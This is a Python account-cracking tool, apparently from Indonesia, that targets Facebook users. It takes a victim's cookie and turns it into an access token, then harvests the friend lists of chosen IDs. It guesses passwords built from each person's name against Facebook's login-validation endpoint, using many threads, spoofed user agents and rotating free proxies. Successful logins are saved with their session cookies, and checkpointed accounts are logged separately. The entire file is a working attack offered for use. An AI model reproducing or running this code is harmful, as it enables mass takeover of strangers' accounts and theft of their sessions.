#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
pwpluss, pwnya = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0
ugent =[]

#----------[ USER-CRACK ]----------#  

for z in range(200):
	rc = random.choice; rr = random.randint
	android = str(random.randint(4,12))
	gt = random.choice(["SM-G975F","SM-G532G","SM-N975F","SM-G988U","SM-G977U","SM-A705FN","SM-A515U1","SM-G955F","SM-A750G","SM-N960F","SM-G960U","SM-J600F","SM-A908B","SM-A705GM","SM-G970U","SM-A307FN","SM-G965U1","SM-A217F","SM-G986B","SM-A207M","SM-A515W","SM-A505G","SM-A315G","SM-A507FN","SM-A505U1","SM-G977T","SM-A025G","SM-J320F","SM-A715W","SM-A908N","SM-A205F","SM-G988B","SM-N986B","SM-A715F","SM-A515F","SM-G965F","SM-G960F","SM-A505F","SM-A207F","SM-A307G","SM-G970F","SM-A107F","SM-G935F","SM-G935A","SM-A310F","SM-J320FN"])
	ua = f"Mozilla/5.0 (Linux; Android {android}; {gt}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,100))}.0.{str(rr(3400,5999))}.{str(rr(100,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(200,700))}.0.0.{str(rr(10,30))}.{str(rr(30,150))};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{str(rr(111111111,999999999))};FBCR/Indosat;FBMF/Samsung;FBBD/Samsung;FBDV/{gt};FBSV/{android};FBOP/16]"
	if ua in ugent:pass
	else:ugent.append(ua)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua2=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua2=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua2.write(un+'\n')
		ua2=open('.bbnew.txt','r').read().splitlines()
ua2 = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.03.54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.02.33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]"])

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
P = '\x1b[1;97m'
KON='\x1b[38;5;46m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login_cokies()
def x_shinchan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
      	
#----------[ BANNER ]----------#
def banner():
      print(f'''MALING''')
    	
    	
#----------[ LOGIN-COKIES ]----------#        
def login_cokies():
    try:
        banner()
        ses = requests.Session()
        x_shinchan('──'* 25)
        your_cookies=input(f'{H}⌲{puti} Cookies {hijo}: ')
        with requests.Session() as r:
                r.headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': ''
                }
                response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
                code, user_code = response['code'], response['user_code']
                verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
                r.headers.pop(
                    'content-type'
                )
                r.headers.update({
                    'sec-fetch-mode': 'navigate',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site': 'cross-site',
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest': 'document',
                })
                response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
                if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
                    x_shinchan('──'* 25)
                    print(f"{H}⌲{mer} Cookie Invalid..", end='\r');time.sleep(3.5);exit();print("                     ", end='\r')
                else:
                    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
                    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    data = {
                        'fb_dtsg': fb_dtsg,
                        'jazoest': jazoest,
                        'qr': 0,
                        'user_code': user_code,
                    }
                    r.headers.update({
                        'origin': 'https://m.facebook.com',
                        'referer': verification_url,
                        'content-type': 'application/x-www-form-urlencoded',
                        'sec-fetch-site': 'same-origin',
                    })
                    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
                    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

                        action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
                        fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
                        jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
                        scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
                        display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
                        user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
                        logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
                        auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
                        encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
                        return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
                        r.headers.update({
                            'origin': 'https://m.facebook.com',
                            'referer': response3.url,
                            'content-type': 'application/x-www-form-urlencoded',
                        })
                        data = {
                            'fb_dtsg': fb_dtsg,
                            'jazoest': jazoest,
                            'scope': scope,
                            'display': display,
                            'user_code': user_code,
                            'logger_id': logger_id,
                            'auth_type': auth_type,
                            'encrypted_post_body': encrypted_post_body,
                            'return_format[]': return_format,
                        }
                        response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
                        windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
                        r.headers.pop(
                            'content-type'
                        );r.headers.pop(
                            'origin'
                        )
                        r.headers.update({
                            'referer': 'https://m.facebook.com/',
                        })
                        response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
                        if 'Sukses!' in str(response6):
                            r.headers.update({
                                'sec-fetch-mode': 'no-cors',
                                'referer': 'https://graph.facebook.com/',
                                'Host': 'graph.facebook.com',
                                'accept': '*/*',
                                'sec-fetch-dest': 'script',
                                'sec-fetch-site': 'cross-site',
                            })
                            response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                            access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                            x_shinchan('──'* 25)
                            print(f"{H}⌲{hijo} {access_token}")
                            ken = open(".cyxieontoken.txt", "w").write(access_token)
                            cok = open(".cyxieoncokies.txt", "w").write(your_cookies)
                            x_shinchan('──'* 25)
                            suk = input(f'{H}⌲{puti} Tekan Enter ] ');menu()                       
                        else:
                            x_shinchan('──'* 25)
                            exit(f'{H}⌲{mer} Login gagal.. ')
    except Exception as e:
        x_shinchan('──'* 25)
        exit(f"{H}⌲{mer} Login Gagal cookie invali")
        time.sleep(3)
        ganti_cokies()		
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
        try:
            token = open('.cyxieontoken.txt','r').read()
            cok = open('.cyxieoncokies.txt','r').read()
            tokene.append(token)
            try:
                baz_ganteng = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokene[0], cookies={'cookie':cok})
                useridz = json.loads(baz_ganteng.text)['id']
                username = json.loads(baz_ganteng.text)['name']
            except KeyError:
                x_shinchan('──'* 25)
                print(f"{H}⌲{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
                time.sleep(3)
                login_cokies()
        except requests.exceptions.ConnectionError:
            x_shinchan('──'* 25)
            exit(f"{H}⌲{mer} Koneksi Problem ")
        except IOError:
            x_shinchan('──'* 25)
            print(f"{H}⌲{mer} Akun anda terkena limit atau mode free silakan ganti cookies atau ubah ke mode data :-(")
            time.sleep(3)
            login_cokies()
        except IOError:
            ganti_cokies()
            x_shinchan('──'* 25)
            exit(f"{H}⌲{mer} Cokies Expired ")
        os.system('clear')
        banner()
        dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
        tgl = datetime.datetime.now().day
        bln = dic[(str(datetime.datetime.now().month))]
        thn = datetime.datetime.now().year
        ip = requests.get("https://api.ipify.org").text
        x_shinchan('──'* 25)
        print(f'USER NAME  : {username}')
        print(f'USER ID    : {useridz}')
        print(f'DDWWYYYY   : '+str(tgl)+'.'+str(bln)+'.'+str(thn))
        print(f'ALAMAT IP  : {ip}')
        x_shinchan('──'* 25)
        print(f'{H}⌲{puti} 01. CRACK ')
        print(f'{H}⌲{puti} 02. CRACK BRUTAL ')
        print(f'{H}⌲{puti} 03. CEK HASIL OK ')
        print(f'{H}⌲{puti} 04. CEK HASIL CP ')
        print(f'{H}⌲{puti} 00. GANTI COOKIES ')
        x_shinchan('──'* 25)
        CYXIEON_GANTENG = input(f'{H}⌲{puti} Pilih : ')
        if CYXIEON_GANTENG in ['01','1']:
            crack_publik()
        if CYXIEON_GANTENG in ['02','2']:
            dump_massal()
        elif CYXIEON_GANTENG in ['04','4']:
            hasil_cp()
        elif CYXIEON_GANTENG in ['03','3']:
            hasil_ok()
        elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()
            x_shinchan('──'* 25)
            print(f"{H}⌲{mer} Berhasil Hapus Cokies ")  
            time.sleep(3)      
            exit()    
        else:
            x_shinchan(f'\r──'* 25)
            exit(f"{H}⌲{mer} Pilihan Salah")            

#----------[ CRACK-PUBLIK  ]----------#            
def crack_publik():
	with requests.Session() as ses:
		token = open('.cyxieontoken.txt','r').read()
		cok = open('.cyxieoncokies.txt','r').read()		
		x_shinchan('──'* 25)
		a = input(f'{H}⌲ {P}Masukan ID Target: ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			x_shinchan('──'* 25)
			print('⌲ Total ID terkumpul : {}'.format(len(id)));atur_id()
		except Exception as e:
			print(e)
	      
def dump_massal():    
 try:
  token = open('.cyxieontoken.txt','r').read()
  cok = open('.cyxieontoken.txt','r').read()
 except IOError:
     exit()
 try:
  a = int(input(f'{H}⌲ {P}Mau Berapa ID? : '))
 except ValueError:
     exit()
 if a<1 or a>1000:
     exit()
 ses=requests.Session()
 bilangan = 0
 for KOTG49H in range(a):
  bilangan+=1
  Masukan = input(f'\x1b[0m{H}⌲{P} Masukkan ID Yang Ke  '+str(bilangan)+f' : ')
  uid.append(Masukan)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for xr in url['friends']['data']:
            try:
                woy = (xr['id']+'|'+xr['name'])
                if woy in id:pass
                else:id.append(woy)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
         exit()
 try:
       print("⌲ Total ID terkumpul : "+str(len(id))) 
       atur_id()
 except requests.exceptions.ConnectionError:
     exit()
 except (KeyError,IOError):
  exit()
#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('XSHIN-OK')
	except FileNotFoundError:
		x_shinchan('──'* 25)
		exit(f"{H}⌲{mer} File tidak di temukan ")
	if len(vin)==0:
		x_shinchan('──'* 25)
		exit(f"{H}⌲{mer} Tidak mempuyai file OK ")
	else:
		x_shinchan('──'* 25)
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('XSHIN-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{H}⌲{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{H}⌲{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		x_shinchan('──'* 25)
		geeh = input(f'{H}⌲{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    x_shinchan('──'* 25)
		    exit(f"{H}⌲{mer} Pilih yang bener :-( ")
		try:lin = open('XSHIN-OK/'+geh,'r').read().splitlines()
		except:
		    x_shinchan('──'* 25)
		    exit(f"{H}⌲{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		x_shinchan('──'* 25)
		input(f'{H}⌲{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('XSHIN-CP')
	except FileNotFoundError:
		x_shinchan('──'* 25)
		exit(f"{H}⌲{mer} File tidak di temukan ")
	if len(vin)==0:
		x_shinchan('──'* 25)
		exit(f"{H}⌲{mer} Tidak mempuyai file OK ")
	else:
		x_shinchan('──'* 25)
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('XSHIN-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{H}⌲{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{H}⌲{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		x_shinchan('──'* 25)
		geeh = input(f'{H}⌲{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    x_shinchan('──'* 25)
		    exit(f"{H}⌲{mer} Pilih yang bener :-( ")
		try:lin = open('XSHIN-CP/'+geh,'r').read().splitlines()
		except:
		    x_shinchan('──'* 25)
		    exit(f"{H}⌲{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		x_shinchan('──'* 25)
		input(f'{H}⌲{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	x_shinchan('──'* 25)
	print(f'{H}⌲{puti} 01. B-API ')
	print(f'{H}⌲{puti} 02. Mobile validate')
	#print(f'{H}⌲{puti} 03. Mobile validate all region ')      
	x_shinchan('──'* 25) 
	CYXIEON_METHODE = input(f'{H}⌲{puti} Pilih Metode : ')
	if CYXIEON_METHODE in ['2','02']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['1','01']:
	   method.append('B-API')       
	#elif CYXIEON_METHODE in ['3','03']:
	   #method.append('kontol')
	else:
		method.append('validate')
	x_shinchan('──'* 25)
	pwplus=input(f'{H}⌲{P} add Password manual Y/T {H}⌲{P} ')
	x_shinchan('──'* 25)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'{H}⌲{P} Masukan sandi :  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	    pwpluss.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	x_shinchan('──'* 25)
	print(f'            {puti} [WAITING•TUNGGULAH]           ')
	x_shinchan('──'* 25)
	with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwx = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
						
				else:
					if len(frs)<3:
						pwx.append(nmf)
					else:
						pwx.append(nmf)
					pwx.append(frs+frs)
					pwx.append(frs+'123')
					pwx.append(frs+'1234')
					pwx.append(frs+'12345')
					pwx.append(frs+'123456')
					pwx.append(frs+'321')
					pwx.append(frs+'01')
					pwx.append(frs+'02')
					pwx.append(frs+'03')
					pwx.append(frs+'04')
					pwx.append(frs+'05')
					pwx.append(frs+'06')
					pwx.append(frs+'07')
					pwx.append(frs+'08')
					pwx.append(frs+'09')
					pwx.append(frs+'10')
					pwx.append(frs+'12')
					pwx.append(frs+'99')
					
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwx.append(xpwd)
				else:pass
				if 'B-API' in method:
				    pool.submit(crack,idf,pwv)
				elif 'kontol' in method:
				    pool.submit(xshinchan,idf,pwx)
				elif 'validate' in method:
				    pool.submit(crackvalidate,idf,pwx,'m.prod.facebook.com')
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	bo = random.choice([hijo,KON,])
	rc = random.choice
	sys.stdout.write(f"\r{bo}•RIZKI378•{puti}{puti}[{loop}]{puti}{puti}[{hijo}{len(id)}{puti}][{puti}ok:{puti}{hijo}{ok}{P}][{puti}cp:{puti}{kun}{cp}{P}]{puti}{P}[{bo}{idf}{P}]")
	ses = requests.Session()
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			rr = random.randint
			ua = random.choice(ugent)
			link = ses.get("https://m.prod.facebook.com/login/device-based/password/?uid="+idf+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v13.0/dialog/oauth?display=popup&response_type=code&client_id=1228878007175405&redirect_uri=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook&state=adb3174a9d95b35b079097f6fc72338f&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=fc06039c-fdb6-4206-aca9-fe761849929a&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,24))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D1228878007175405%26redirect_uri%3Dhttps%253A%252F%252Fwww.ajidesign.net%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Dadb3174a9d95b35b079097f6fc72338f%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfc06039c-fdb6-4206-aca9-fe761849929a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ajidesign.net%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dadb3174a9d95b35b079097f6fc72338f%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('XSHIN-OK/'+'XSHIN-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
				open('XSHIN-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('XSHIN-CP/'+'XSHIN-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
				akune.append(idf+'|'+pw)
